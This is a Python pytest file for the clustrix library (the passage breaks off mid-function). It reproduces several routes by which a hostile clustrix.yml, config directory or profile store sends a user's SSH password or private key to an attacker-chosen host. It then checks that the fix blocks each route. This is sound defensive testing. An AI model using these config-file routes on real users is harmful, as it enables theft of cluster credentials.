#!/usr/bin/env python3
"""A ``./clustrix.yml`` must not decide who receives your cluster password.

The exfiltration, end to end, and reproduced here before it was fixed:

* ``~/.clustrix/.env`` holds ``SSH_PASSWORD=...`` and nothing else. This is
  the *documented* setup -- the credential file holds the secret and the
  configuration file holds the host.
* ``_load_default_config()`` searches ``<config dir>/config.{yml,yaml,json}``
  and then ``./clustrix.{yml,yaml,json}``. ``~/.clustrix/clustrix.yml`` is
  **not** in that list, so in the ordinary case where the user has no
  ``config.yml`` the working-directory file wins outright.
* ``ConnectionManager.setup_ssh_connection`` read
  ``ensure_credential("ssh")["password"]`` and applied it to
  ``config.cluster_host`` with no host check whatsoever -- the same defect
  issue #167 had just fixed one layer up in
  ``FlexibleCredentialAuthMethod``.

So cloning a repository that ships a ``clustrix.yml`` and running anything
inside it was enough to have the cluster password sent to a host of the
repository's choosing. The earlier argument for leaving this alone -- that
``config.cluster_host`` "comes from the user's own config, not an attacker"
-- is false for exactly this reason.

Nothing here is mocked and nothing connects to a real host. The attacker's
host is a real ``LocalSSHServer`` on loopback, configured to accept the
sentinel password and nothing else, so a successful authentication is proof
that the sentinel really travelled from the ``.env`` file onto the wire. If
the server records no authentication at all, the secret was not offered.

The fix is not "require an exact host match", which would break the
documented setup above: a bare ``SSH_PASSWORD`` names no host and so could
never match one. It is that a credential naming no host may only be used
against a ``cluster_host`` from a source the *user* chose -- the clustrix
configuration directory, an explicit ``load_config(path)``, or Python. See
``clustrix.auth_methods.stored_credential_is_for_config``.
"""

import contextlib
import copy
import json
import os
import pathlib
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import textwrap
import warnings

import paramiko
import pytest

import clustrix
import clustrix.config as config_module
import clustrix.credential_manager as credential_manager_module
import clustrix.credential_release as credential_release_module
from clustrix.auth_fallbacks import setup_auth_with_fallback
from clustrix.auth_methods import stored_credential_is_for_config
from clustrix.credential_release import (
    CredentialRelease,
    CredentialTarget,
    derived_provenance,
    release_credential,
)
from clustrix.config import (
    CONFIG_SOURCES_KEY,
    CONFIG_SOURCE_EXPLICIT_FILE,
    CONFIG_SOURCE_RUNTIME,
    CONFIG_SOURCE_USER_CONFIG_DIR,
    CONFIG_SOURCE_WORKING_DIRECTORY,
    TRUSTED_CONFIG_SOURCES,
    ClusterConfig,
    configure,
    get_config,
    get_config_dir,
    get_config_source,
    load_config,
    record_discovered_hostname,
)
from clustrix.executor_connections import ConnectionManager
from clustrix.ssh_security import configure_host_key_policy
from tests.ssh_server import LocalSSHServer

#: The value that must never leave the machine. Assembled from parts so that
#: no secret-shaped literal appears in the source.
SENTINEL_PASSWORD = "-".join(["clustrix", "sentinel", "sshpassword", "value"])

#: The name the attacker's configuration file is written under. It is a
#: loopback address in the test because the whole point is to prove the
#: password reaches whoever the file names; on a real machine this would be
#: ``totally-unrelated.attacker.example``.
SSH_ENV_NAMES = ("SSH_PASSWORD", "SSH_HOST", "SSH_USERNAME", "SSH_PRIVATE_KEY_PATH")


@pytest.fixture
def env_file(monkeypatch):
    """A ``.env`` in the (already isolated) clustrix configuration directory.

    ``tests/conftest.py`` points ``$HOME`` and ``CLUSTRIX_CONFIG_DIR`` at
    throwaway directories for every test, so this never goes near the
    developer's real ``~/.clustrix/.env``. The shell's own ``SSH_*``
    variables are removed as well: the environment is a *second* credential
    source, and one of them supplying the password would make the assertions
    below say nothing about the file.
    """
    for name in SSH_ENV_NAMES:
        monkeypatch.delenv(name, raising=False)

    config_dir = get_config_dir()
    config_dir.mkdir(mode=0o700, parents=True, exist_ok=True)

    def write(**values):
        path = config_dir / ".env"
        path.write_text(
            "".join(f"{k}={v}\n" for k, v in values.items()), encoding="utf-8"
        )
        path.chmod(0o600)
        # The manager is a process-wide singleton that caches its sources.
        credential_manager_module._credential_manager = None
        return path

    return write


def _config_text(server, **extra):
    lines = [
        "cluster_type: ssh",
        f"cluster_host: {server.host}",
        f"cluster_port: {server.port}",
        "username: victim",
        "ssh_host_key_policy: auto_add",
    ]
    lines += [f"{k}: {v}" for k, v in extra.items()]
    return "\n".join(lines) + "\n"


def _attempt_connection():
    """Whether the shipped connection path authenticated. No exception here.

    A refused credential surfaces as an ``AuthenticationException``, and
    letting that propagate would make the *first* assertion be about the
    exception rather than about what the server saw. What the server saw is
    the measurement that matters, so the failure is turned into ``False``
    and asserted alongside it.
    """
    manager = ConnectionManager(get_config())
    try:
        manager.setup_ssh_connection()
    except Exception:
        return False
    else:
        return manager.ssh_client.get_transport().is_authenticated()
    finally:
        manager.disconnect()


@pytest.fixture
def attacker_server(tmp_path):
    """A real SSH server that accepts the sentinel password and only that.

    Standing in for the host a hostile ``clustrix.yml`` names. Because the
    only accepted password is the sentinel, an entry in
    ``server.authentications`` is a *measurement* that the sentinel was
    transmitted, not an inference.
    """
    root = tmp_path / "attacker-root"
    root.mkdir()
    with LocalSSHServer(root=str(root), password=SENTINEL_PASSWORD) as server:
        yield server


# --------------------------------------------------------------------------
# The exfiltration itself.
# --------------------------------------------------------------------------


def test_a_working_directory_config_file_never_receives_the_password(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """The reproduction. RED before the fix: the server logs the password.

    Before ``stored_credential_is_for_config`` existed this authenticated,
    ``server.authentications`` held ``("victim", "password")``, and that
    tuple could only have been produced by the sentinel from ``.env``
    arriving at a host chosen by a file in the working directory.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)

    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    assert get_config().cluster_host == attacker_server.host
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "the stored password was sent to a host named by a file in the "
        "working directory: " + repr(attacker_server.authentications)
    )
    assert not authenticated


def test_the_documented_setup_still_authenticates(
    attacker_server, env_file, monkeypatch
):
    """The fix must not break ``.env`` password + host in a config file.

    This is the workflow the documentation describes and the reason an
    exact-host-match rule was not available: a bare ``SSH_PASSWORD`` names
    no host, so it can never match one. Here the identical credential is
    used, because the host came from the clustrix configuration directory
    -- somewhere the user had to go to put it.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    config_dir = get_config_dir()
    (config_dir / "config.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )

    config_module._load_default_config()

    assert get_config_source(get_config()) == CONFIG_SOURCE_USER_CONFIG_DIR
    assert _attempt_connection() is True
    assert attacker_server.authentications[-1] == ("victim", "password")


def _victim_keypair(tmp_path):
    """A private key the victim already has, and its public half.

    **In ``~/.ssh/id_rsa``, which is where it actually lives**, not in a
    throwaway directory. This wrote it to ``tmp_path`` and named it only in
    ``key_file``, and that is why route 10's test below passed while route
    13 was open: with the key somewhere paramiko's own search would never
    look, refusing the ``key_file`` branch looked like refusing the key.
    Put the key where every user keeps it and a connection that "refuses"
    while leaving ``look_for_keys`` on authenticates anyway.

    ``$HOME`` is a throwaway per test (``tests/conftest.py::isolate_home``),
    so this never goes near the developer's own key.
    """
    import paramiko

    private = pathlib.Path.home() / ".ssh" / "id_rsa"
    private.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    key = paramiko.RSAKey.generate(2048)
    key.write_private_key_file(str(private))
    private.chmod(0o600)
    public = tmp_path / "id_victim.pub"
    public.write_text(f"ssh-rsa {key.get_base64()} victim\n", encoding="utf-8")
    return private, public


def test_a_working_directory_config_naming_a_key_file_does_not_offer_the_key(
    env_file, tmp_path, monkeypatch
):
    """Route 10. RED before the fix: the attacker logs in with the victim's key.

    ``key_file`` is an ordinary declared field, so the ``./clustrix.yml``
    that names ``cluster_host`` names it too -- and both connection paths
    tested ``config.key_file`` **before** asking the gate, so the gate was
    not reached at all. ``git clone && cd`` was enough to have the victim's
    private key offered to a host the repository chose.

    The measurement is real: the attacker's server holds the victim's
    *public* key in its authorized list, which is what an attacker who
    scraped it would have, and refuses password auth outright. An entry in
    ``server.authentications`` therefore means the private key was
    presented and possession of it proved.
    """
    private, public = _victim_keypair(tmp_path)
    env_file()

    root = tmp_path / "attacker-root"
    root.mkdir()
    with LocalSSHServer(
        root=str(root), password=None, authorized_keys=[str(public)]
    ) as server:
        cloned_repository = tmp_path / "cloned-repository"
        cloned_repository.mkdir()
        (cloned_repository / "clustrix.yml").write_text(
            _config_text(server, key_file=str(private)), encoding="utf-8"
        )
        monkeypatch.chdir(cloned_repository)

        with pytest.warns(UserWarning, match="current working directory"):
            config_module._load_default_config()

        assert get_config().key_file == str(private)
        authenticated = _attempt_connection()

        assert server.authentications == [], (
            "the victim's private key was offered to a host named by a file "
            "in the working directory: " + repr(server.authentications)
        )
        assert not authenticated


def test_a_key_file_from_a_config_the_user_chose_still_authenticates(
    env_file, tmp_path
):
    """The fix must not stop ``key_file`` working where it always has.

    Same key, same server, same field -- the only difference is that the
    host came from the clustrix configuration directory, somewhere the user
    had to go to put it.
    """
    private, public = _victim_keypair(tmp_path)
    env_file()

    root = tmp_path / "served"
    root.mkdir()
    with LocalSSHServer(
        root=str(root), password=None, authorized_keys=[str(public)]
    ) as server:
        (get_config_dir() / "config.yml").write_text(
            _config_text(server, key_file=str(private)), encoding="utf-8"
        )
        config_module._load_default_config()

        assert get_config_source(get_config()) == CONFIG_SOURCE_USER_CONFIG_DIR
        assert _attempt_connection() is True
        assert server.authentications[-1] == ("victim", "publickey")


def test_the_ssh_key_fallback_does_not_hand_a_hostless_password_to_a_repo_host(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """Route 9, end to end. RED before the fix: the server logs the sentinel.

    ``setup_auth_with_fallback`` -> ``get_cluster_password`` ->
    ``$CLUSTRIX_DEFAULT_PASSWORD`` -- a variable that names **no host** --
    handed to ``config.cluster_host``, which a cloned repository's
    ``clustrix.yml`` chose. The reviewer measured the sentinel arriving at
    the attacker's server *while ``release_credential`` was refusing the
    same host in the same process*, which is what an unconverted call site
    looks like. Lock 3 could never have caught it: it reads ``os.environ``
    directly and never touches the store.
    """
    env_file()
    monkeypatch.setenv("CLUSTRIX_DEFAULT_PASSWORD", SENTINEL_PASSWORD)

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)

    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    offered = []

    def setup_ssh_keys(config, **kwargs):
        """Stand-in for the real key setup: it connects with what it is given.

        The measurement is the server's log, not this function's argument
        -- ``password`` is carried to a real ``paramiko.connect`` so that
        an entry in ``server.authentications`` means the sentinel was
        transmitted.
        """
        password = kwargs.get("password")
        offered.append(password)
        if password:
            client = paramiko.SSHClient()
            # The sanctioned path, and the one the config asks for:
            # ``_config_text`` sets ssh_host_key_policy=auto_add, so this is
            # what clustrix itself would install. Naming paramiko's policy
            # class here would trip tests/unit/test_no_autoadd_policy.py,
            # and rightly.
            configure_host_key_policy(client, config)
            try:
                client.connect(
                    hostname=config.cluster_host,
                    port=config.cluster_port,
                    username=config.username,
                    password=password,
                    allow_agent=False,
                    look_for_keys=False,
                )
            except Exception:
                pass
            finally:
                client.close()
        return {"success": False, "connection_tested": False, "error": "publickey"}

    monkeypatch.setattr("clustrix.auth_fallbacks.detect_environment", lambda: "unknown")
    setup_auth_with_fallback(get_config(), setup_ssh_keys)

    assert attacker_server.authentications == [], (
        "the hostless default password was sent to a host named by a file "
        "in the working directory: " + repr(attacker_server.authentications)
    )
    assert SENTINEL_PASSWORD not in offered


def test_the_ssh_key_fallback_still_works_for_a_host_the_user_chose(
    attacker_server, env_file, monkeypatch
):
    """The fix must not disable the fallback where it always worked."""
    env_file()
    monkeypatch.setenv("CLUSTRIX_DEFAULT_PASSWORD", SENTINEL_PASSWORD)

    (get_config_dir() / "config.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    config_module._load_default_config()

    assert get_config_source(get_config()) == CONFIG_SOURCE_USER_CONFIG_DIR

    offered = []

    def setup_ssh_keys(config, **kwargs):
        offered.append(kwargs.get("password"))
        return {"success": False, "connection_tested": False, "error": "publickey"}

    monkeypatch.setattr("clustrix.auth_fallbacks.detect_environment", lambda: "unknown")
    setup_auth_with_fallback(get_config(), setup_ssh_keys)

    assert SENTINEL_PASSWORD in offered


def test_a_credential_that_names_this_host_is_used_from_anywhere(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """``SSH_HOST`` in the credential file is the user authorising a host.

    Provenance only decides the case where the credential names no host. A
    credential that names one has already been told where it may go, so a
    working-directory config file naming that same host is not an escalation
    -- the user authorised it in a file only they can write.

    The host key is trusted deliberately here rather than by
    ``ssh_host_key_policy: auto_add`` in the working-directory file, which
    no longer has that power: a weakening of host key verification is a
    security decision and may only come from a source the user chose. That
    was scaffolding for this test rather than its subject, and answering
    the host key question separately is what ``_the_host_is_already_known``
    exists for.
    """
    env_file(SSH_HOST=attacker_server.host, SSH_PASSWORD=SENTINEL_PASSWORD)
    _the_host_is_already_known(attacker_server)

    project = tmp_path / "project"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(project)

    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    assert _attempt_connection() is True
    assert attacker_server.authentications[-1] == ("victim", "password")


def test_a_credential_for_another_host_is_refused_from_a_trusted_config(
    attacker_server, env_file
):
    """A named host that does not match is refused however trusted the config.

    Rule 1 does not defer to rule 2: once the credential says which host it
    is for, a trusted configuration naming a different host does not make it
    eligible. Otherwise a user with several clusters would hand cluster A's
    password to cluster B.
    """
    env_file(SSH_HOST="somewhere.else.example", SSH_PASSWORD=SENTINEL_PASSWORD)

    config_dir = get_config_dir()
    (config_dir / "config.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    config_module._load_default_config()

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], repr(attacker_server.authentications)
    assert not authenticated


# --------------------------------------------------------------------------
# The decision function, over the cases that are awkward to reach end to end.
# --------------------------------------------------------------------------


def test_the_refusal_names_the_reason():
    """A refusal nobody can act on is a support ticket.

    Both halves of the message have to be there: what was rejected, and the
    two ways to make it work.
    """
    config = ClusterConfig(cluster_type="ssh", cluster_host="cluster.example.edu")
    config_module.set_config_source(config, CONFIG_SOURCE_WORKING_DIRECTORY)

    refusal = stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD})

    assert refusal is not None
    assert "SSH_HOST" in refusal
    assert "working-directory" in refusal
    assert "load_config" in refusal


@pytest.mark.parametrize(
    "source",
    [CONFIG_SOURCE_RUNTIME, CONFIG_SOURCE_EXPLICIT_FILE, CONFIG_SOURCE_USER_CONFIG_DIR],
)
def test_a_hostless_credential_is_released_to_every_trusted_source(source):
    config = ClusterConfig(cluster_type="ssh", cluster_host="cluster.example.edu")
    config_module.set_config_source(config, source)

    assert stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD}) is (
        None
    )


def test_a_config_with_no_recorded_source_is_untrusted():
    """An absent value must never satisfy a security test.

    A ``ClusterConfig`` that never ran ``__post_init__`` -- one restored by
    ``pickle``, say -- has no recorded provenance, and "no record" has to
    read as untrusted rather than as trusted-by-default.
    """
    config = ClusterConfig(cluster_type="ssh", cluster_host="cluster.example.edu")
    del config._clustrix_config_source

    assert get_config_source(config) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD})


# --------------------------------------------------------------------------
# Provenance is recorded by every route into the configuration.
# --------------------------------------------------------------------------


def test_python_is_a_trusted_source():
    assert get_config_source(ClusterConfig()) == CONFIG_SOURCE_RUNTIME


def test_configure_reclaims_a_host_a_working_directory_file_had_set(
    tmp_path, monkeypatch
):
    """``configure(cluster_host=...)`` is the user overriding the file."""
    project = tmp_path / "project"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\ncluster_host: named.by.the.repository\n", encoding="utf-8"
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY

    # Changing something else does not launder the host.
    configure(cluster_port=2222)
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY

    configure(cluster_host="cluster.example.edu")
    assert get_config_source(get_config()) == CONFIG_SOURCE_RUNTIME


def test_an_explicitly_loaded_file_is_trusted_wherever_it_lives(tmp_path, monkeypatch):
    """``load_config(path)`` means the caller named the path.

    Including a path in the working directory: naming it is the choice that
    the automatic search does not have.
    """
    project = tmp_path / "project"
    project.mkdir()
    path = project / "clustrix.yml"
    path.write_text("cluster_type: ssh\ncluster_host: chosen.example.edu\n")
    monkeypatch.chdir(project)

    load_config(str(path))

    assert get_config_source(get_config()) == CONFIG_SOURCE_EXPLICIT_FILE


def test_the_provenance_is_never_written_to_disk(tmp_path):
    """It is not a dataclass field, and a config file may not set it.

    If it were persistable, a hostile ``clustrix.yml`` could simply declare
    itself trusted.
    """
    from dataclasses import asdict, fields

    from clustrix.config import PERSISTABLE_KEYS, strip_secret_fields

    names = {f.name for f in fields(ClusterConfig)}
    assert "_clustrix_config_source" not in names
    assert "_clustrix_config_source" not in PERSISTABLE_KEYS
    assert "_clustrix_config_source" not in asdict(ClusterConfig())
    assert "_clustrix_config_source" not in strip_secret_fields(
        {"_clustrix_config_source": CONFIG_SOURCE_RUNTIME, "cluster_type": "ssh"}
    )

    hostile = tmp_path / "clustrix.yml"
    hostile.write_text(
        "cluster_type: ssh\n_clustrix_config_source: runtime\n", encoding="utf-8"
    )
    with pytest.raises(ValueError, match="unknown setting"):
        load_config(str(hostile))


# --------------------------------------------------------------------------
# Provenance cannot be laundered from untrusted to trusted.
#
# The rule above is only worth anything if "untrusted" sticks. A second,
# adversarial reading of it found several routes that turned a
# working-directory host back into a trusted one, one of which needs no
# adversary at all -- the notebook widget's Apply button does it in ordinary
# use. What they have in common is that they rebuild a ``ClusterConfig``
# from an existing one's *field values*: ``__post_init__`` runs again on the
# new object and records ``runtime``, the trusted end of the scale, even
# though the hostname is still the string the untrusted file supplied.
# --------------------------------------------------------------------------


def test_a_widget_apply_round_trip_does_not_launder_a_working_directory_host(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """``configure(**asdict(config))`` is not the user typing the host.

    The reachable one. ``notebook_magic_widget`` auto-loads ``./clustrix.yml``
    when it opens, ``_save_config_from_widgets`` puts ``cluster_host`` in the
    dict it builds, and Apply calls ``configure(**config_data)``. So the
    widget reads a hostname out of a file nobody chose and hands it straight
    back to the function that means "this came from Python", and the config
    ends up marked ``runtime``. Nobody has to do anything unusual: opening
    the widget in a cloned repository and pressing Apply is the whole
    sequence.

    RED before the fix: source ``runtime``, and the sentinel reaches the
    attacker's server.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    from dataclasses import asdict

    configure(**asdict(get_config()))

    assert get_config().cluster_host == attacker_server.host
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "a round trip through configure() re-marked a working-directory "
        "host as trusted: " + repr(attacker_server.authentications)
    )
    assert not authenticated


def test_dataclasses_replace_does_not_launder_a_working_directory_host(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """``replace`` copies a config; it does not re-choose the hostname.

    ``dataclasses.replace(cfg, cores=8)`` calls ``cfg.__class__(**fields)``,
    so ``__post_init__`` runs on the copy and the copy claims ``runtime``.
    Changing an unrelated field is not consent to a hostname.

    RED before the fix: source ``runtime``, and the sentinel reaches the
    attacker's server.
    """
    import dataclasses

    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    copied = dataclasses.replace(get_config(), default_cores=2)

    assert copied.cluster_host == attacker_server.host
    assert get_config_source(copied) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert stored_credential_is_for_config(copied, {"password": SENTINEL_PASSWORD})

    manager = ConnectionManager(copied)
    try:
        manager.setup_ssh_connection()
    except Exception:
        pass
    finally:
        manager.disconnect()

    assert (
        attacker_server.authentications == []
    ), "dataclasses.replace re-marked a working-directory host as trusted: " + repr(
        attacker_server.authentications
    )


def test_a_host_a_working_directory_file_named_stays_untrusted_in_a_fresh_object(
    tmp_path, monkeypatch
):
    """The rule stated on its own, without a server.

    Once an untrusted file has named a hostname in this process, building
    any config around that hostname does not make it the user's choice --
    because the two really are indistinguishable, and the safe answer to an
    indistinguishable pair is the untrusted one.

    The two spellings differ in case and in the trailing dot, which are the
    two things DNS does not treat as significant. Comparing the strings
    as-written would let ``Named.By.The.Repository.`` in the file and
    ``named.by.the.repository`` in the code be two different hosts, which is
    the same "a partial match is a different question" defect
    ``hostname_matches`` documents -- so both ends go through the one
    normalisation.
    """
    project = tmp_path / "project"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\ncluster_host: Named.By.The.Repository.\n", encoding="utf-8"
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    fresh = ClusterConfig(cluster_type="ssh", cluster_host="named.by.the.repository")

    assert get_config_source(fresh) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert stored_credential_is_for_config(fresh, {"password": SENTINEL_PASSWORD})

    # A host it never named is unaffected: this is a record of hostnames, not
    # a switch that turns trust off.
    other = ClusterConfig(cluster_type="ssh", cluster_host="chosen.example.edu")
    assert get_config_source(other) == CONFIG_SOURCE_RUNTIME


@pytest.mark.parametrize(
    "spelling",
    [
        "_clustrix_config_source",
        "_ClusterConfig__clustrix_config_source",
    ],
)
def test_configure_refuses_to_set_the_provenance_itself(spelling):
    """``configure()`` validated against ``hasattr``, which is not "a field".

    Every attribute an instance happens to carry answers True to
    ``hasattr``, and the provenance record is an instance attribute, so
    ``configure(_clustrix_config_source="runtime")`` was accepted and set
    the config trusted -- a caller asserting its own trustworthiness, which
    is the one claim it must never be able to make. ``load_config`` and
    ``ClusterConfig(**yaml)`` already rejected every spelling; this was the
    remaining way in.
    """
    config_module.set_config_source(get_config(), CONFIG_SOURCE_WORKING_DIRECTORY)

    with pytest.raises(ValueError, match="Unknown configuration parameter"):
        configure(**{spelling: CONFIG_SOURCE_RUNTIME})

    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY


def test_configure_still_accepts_every_declared_field():
    """The validation is narrower, so prove it did not become too narrow."""
    configure(cluster_type="ssh", cluster_host="typed.example.edu", default_cores=3)
    assert get_config().default_cores == 3
    assert get_config_source(get_config()) == CONFIG_SOURCE_RUNTIME


# --------------------------------------------------------------------------
# A configuration directory named by an environment variable.
# --------------------------------------------------------------------------


def test_a_redirected_config_dir_does_not_choose_who_gets_the_password(
    attacker_server, tmp_path, monkeypatch
):
    """``CLUSTRIX_CONFIG_DIR`` is inherited state, not a deliberate act.

    The whole argument for trusting ``<config dir>/config.yml`` is that
    putting a file in ``~/.clustrix`` is something the user did. That does
    not survive the *directory* being named by an environment variable: a
    repository-shipped ``.envrc``, ``Makefile`` or devcontainer sets one for
    every process run inside the checkout, and then ships the ``config.yml``
    to go in it.

    The credential here is an exported ``SSH_PASSWORD`` -- the environment
    credential source -- because that is the case that leaks: a ``.env``
    inside the redirected directory would be the attacker's own file, so its
    contents are not the victim's secret. This is the victim's own shell
    variable going to the repository's host.

    RED before the fix: source ``user-config-dir``, and the sentinel reaches
    the attacker's server.
    """
    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    for name in ("SSH_HOST", "SSH_USERNAME", "SSH_PRIVATE_KEY_PATH"):
        monkeypatch.delenv(name, raising=False)
    credential_manager_module._credential_manager = None

    redirected = tmp_path / "cloned-repository" / "attacker-config"
    redirected.mkdir(parents=True)
    (redirected / "config.yml").write_text(
        _config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(redirected))

    with pytest.warns(UserWarning, match="CLUSTRIX_CONFIG_DIR"):
        config_module._load_default_config()

    assert get_config().cluster_host == attacker_server.host
    assert (
        get_config_source(get_config())
        == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "an exported password went to a host named by a config directory "
        "that an environment variable chose: " + repr(attacker_server.authentications)
    )
    assert not authenticated


def test_the_variable_pointing_at_the_default_directory_is_not_a_redirect(
    monkeypatch, tmp_path
):
    """Setting it *to* ``~/.clustrix`` names the same directory.

    Containers and test harnesses do this routinely, and the comparison is
    made after resolving symlinks so that a symlinked ``~/.clustrix`` is the
    directory it points at rather than a redirect -- redirecting it that way
    needs write access to the home directory, at which point provenance is
    not the problem.
    """
    home = pathlib.Path.home()
    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(home / ".clustrix"))
    assert config_module.config_dir_is_default()

    monkeypatch.setenv("CLUSTRIX_CONFIG_DIR", str(tmp_path / "elsewhere"))
    assert not config_module.config_dir_is_default()

    monkeypatch.delenv("CLUSTRIX_CONFIG_DIR", raising=False)
    assert config_module.config_dir_is_default()


# --------------------------------------------------------------------------
# The environment-variable password method had no gate at all.
# --------------------------------------------------------------------------


def test_an_environment_password_is_not_offered_to_an_untrusted_host(
    tmp_path, monkeypatch
):
    """``EnvironmentPasswordMethod`` checked nothing before handing it over.

    It read ``os.environ[config.password_env_var]`` and returned it, with no
    host check and no provenance check -- the only credential source here
    without one. With a working-directory config the whole method is the
    repository's: the file names ``password_env_var`` as well as
    ``cluster_host``, so it chooses which of the victim's environment
    variables to read *and* where to send it.

    RED before the fix: ``success=True`` and the sentinel handed back.
    """
    from clustrix.auth_methods import EnvironmentPasswordMethod

    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)

    project = tmp_path / "cloned-repository"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\n"
        "cluster_host: named.by.the.repository\n"
        "username: victim\n"
        "use_env_password: true\n"
        "password_env_var: SSH_PASSWORD\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    config = get_config()
    method = EnvironmentPasswordMethod(config)
    assert method.is_applicable({})

    result = method.attempt_auth(
        {"hostname": "named.by.the.repository", "username": "victim"}
    )

    assert not result.success
    assert result.password != SENTINEL_PASSWORD
    assert result.password is None


def test_an_environment_password_still_works_for_a_host_the_user_chose(monkeypatch):
    """And the gate does not break the feature it is gating."""
    from clustrix.auth_methods import EnvironmentPasswordMethod

    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    configure(
        cluster_type="ssh",
        cluster_host="chosen.example.edu",
        username="victim",
        use_env_password=True,
        password_env_var="SSH_PASSWORD",
    )

    result = EnvironmentPasswordMethod(get_config()).attempt_auth(
        {"hostname": "chosen.example.edu", "username": "victim"}
    )

    assert result.success
    assert result.password == SENTINEL_PASSWORD


def test_an_environment_password_is_not_offered_to_some_other_host(monkeypatch):
    """It belongs to ``config.cluster_host``, not to whoever asks."""
    from clustrix.auth_methods import EnvironmentPasswordMethod

    monkeypatch.setenv("SSH_PASSWORD", SENTINEL_PASSWORD)
    configure(
        cluster_type="ssh",
        cluster_host="chosen.example.edu",
        username="victim",
        use_env_password=True,
        password_env_var="SSH_PASSWORD",
    )

    result = EnvironmentPasswordMethod(get_config()).attempt_auth(
        {"hostname": "somewhere.else.example", "username": "victim"}
    )

    assert not result.success
    assert result.password is None


# --------------------------------------------------------------------------
# The profile store is a configuration file too.
#
# Round three's fix watched the doors ``_load_default_config`` opens. The
# profile store is a fourth: ``ProfileManager`` reloads
# ``<config dir>/profiles/profiles.yml`` at construction, all by itself, and
# built each profile with a bare ``ClusterConfig(**parsed)`` -- whose
# ``__post_init__`` stamped ``runtime``, the trusted end of the scale. A
# repository shipping an ``.envrc`` that sets ``CLUSTRIX_CONFIG_DIR`` plus a
# ``profiles/profiles.yml`` under it therefore chose ``cluster_host`` with no
# ``config.yml`` anywhere, nothing tainted and no warning raised.
# --------------------------------------------------------------------------


def _profile_bundle(server, name="Cluster"):
    return (
        f"active_profile: {name}\n"
        f"profiles:\n"
        f"  {name}:\n"
        f"    cluster_type: ssh\n"
        f"    cluster_host: {server.host}\n"
        f"    cluster_port: {server.port}\n"
        f"    username: victim\n"
        f"    ssh_host_key_policy: auto_add\n"
    )


def _write_profile_store(path, server, name="Cluster"):
    """Write a store the way clustrix writes one, and return the path.

    Not by hand. ``_profile_bundle`` is the *pre-provenance* file format --
    ``profiles`` and nothing else -- which is exactly the shape route 9a made
    untrusted, so a positive test hand-writing it would be asserting that a
    legacy store is trusted rather than that the user's own directory is.
    Going through ``save_to_file`` means these fixtures cannot drift away
    from what a real session leaves on disk.
    """
    from clustrix.profile_manager import ProfileManager

    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    manager = ProfileManager(config_dir=str(path.parent))
    manager.profiles = {
        name: ClusterConfig(
            cluster_type="ssh",
            cluster_host=server.host,
            cluster_port=server.port,
